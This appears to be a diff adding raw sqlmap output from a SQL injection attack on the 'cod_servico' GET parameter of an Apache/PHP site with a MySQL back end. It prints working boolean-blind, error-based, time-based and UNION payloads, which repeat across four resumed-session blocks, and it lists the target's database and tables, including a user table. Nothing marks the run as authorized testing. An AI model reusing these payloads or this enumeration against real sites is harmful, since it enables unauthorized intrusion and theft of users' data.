@@ -1,0 +1,124 @@
+sqlmap identified the following injection point(s) with a total of 55 HTTP(s) requests:
+---
+Parameter: cod_servico (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod_servico=12 AND 1923=1923
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod_servico=12 AND (SELECT 7933 FROM(SELECT COUNT(*),CONCAT(0x717a786b71,(SELECT (ELT(7933=7933,1))),0x7178627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod_servico=12 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: cod_servico=-5636 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a786b71,0x4c786c556a7078427666696c46506867524f6c5a68667a4676666143574e575a417279784e594d66,0x7178627871)-- nHzu
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.5.38
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] information_schema
+[*] ise7ecom_i2017@
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod_servico (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod_servico=12 AND 1923=1923
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod_servico=12 AND (SELECT 7933 FROM(SELECT COUNT(*),CONCAT(0x717a786b71,(SELECT (ELT(7933=7933,1))),0x7178627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod_servico=12 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: cod_servico=-5636 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a786b71,0x4c786c556a7078427666696c46506867524f6c5a68667a4676666143574e575a417279784e594d66,0x7178627871)-- nHzu
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.5.38
+back-end DBMS: MySQL >= 5.0
+Database: ise7ecom_i2017@
+[5 tables]
++-------------------+
+| tbl_banner        |
+| tbl_portifolio    |
+| tbl_servicos      |
+| tbl_usuario       |
+| tbl_usuario_nivel |
++-------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod_servico (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod_servico=12 AND 1923=1923
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod_servico=12 AND (SELECT 7933 FROM(SELECT COUNT(*),CONCAT(0x717a786b71,(SELECT (ELT(7933=7933,1))),0x7178627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod_servico=12 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: cod_servico=-5636 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a786b71,0x4c786c556a7078427666696c46506867524f6c5a68667a4676666143574e575a417279784e594d66,0x7178627871)-- nHzu
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.5.38
+back-end DBMS: MySQL >= 5.0
+Database: ise7ecom_i2017@
+[5 tables]
++-------------------+
+| tbl_banner        |
+| tbl_portifolio    |
+| tbl_servicos      |
+| tbl_usuario       |
+| tbl_usuario_nivel |
++-------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod_servico (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod_servico=12 AND 1923=1923
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod_servico=12 AND (SELECT 7933 FROM(SELECT COUNT(*),CONCAT(0x717a786b71,(SELECT (ELT(7933=7933,1))),0x7178627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod_servico=12 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: cod_servico=-5636 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a786b71,0x4c786c556a7078427666696c46506867524f6c5a68667a4676666143574e575a417279784e594d66,0x7178627871)-- nHzu
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.5.38
+back-end DBMS: MySQL >= 5.0
